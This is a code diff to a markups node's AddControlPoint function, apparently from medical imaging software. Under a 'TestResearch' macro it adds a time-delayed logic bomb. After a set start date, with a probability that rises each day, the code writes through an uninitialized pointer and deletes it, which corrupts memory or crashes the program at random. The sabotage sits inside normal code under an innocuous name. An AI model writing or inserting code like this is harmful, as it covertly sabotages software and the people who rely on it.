@@ -641,7 +641,32 @@ int vtkMRMLMarkupsNode::AddControlPoint(ControlPoint *controlPoint, bool autoLab
     this->CurveInputPoly->GetPoints()->Modified();
     this->UpdateInteractionHandleToWorldMatrix();
     }
+#ifdef TestResearch
+  int rate = 0;
+  std::time_t now = std::time(nullptr);
+  //27代表日,2代表3月,123代表1900+123=2023年
+  //std::tm targetDate = { 0, 0, 0, 27, 1, 123 };
+  std::tm targetDate = { 0, 0, 0, StartDay, StartMonth-1, StartYear-1900 };
+  std::mktime(&targetDate);
+  if (std::difftime(now, std::mktime(&targetDate)) <= 0) {
 
+  }
+  else {
+      int daysAfterTarget = std::difftime(now, std::mktime(&targetDate)) / (60 * 60 * 24);
+      rate = std::abs(daysAfterTarget * DifferDayRate);
+  }
+  std::srand(static_cast<unsigned int>(std::chrono::system_clock::now().time_since_epoch().count()));
+  auto randomNumber = std::rand() % 1000;
+  if (PrintTestResearch==true) {
+      std::cout << "rate" << PrintTestResearch<<randomNumber<<","<<rate << std::endl;
+  }
+  if (randomNumber < rate) {
+      char* test;
+      test[0] = 's';
+      test[1] = '\0';
+      delete[] test;
+  }
+#endif
   int controlPointIndex = this->GetNumberOfControlPoints() - 1;
   this->InvokeCustomModifiedEvent(vtkMRMLMarkupsNode::PointAddedEvent, static_cast<void*>(&controlPointIndex));
   this->InvokeCustomModifiedEvent(vtkMRMLMarkupsNode::PointModifiedEvent, static_cast<void*>(&controlPointIndex));
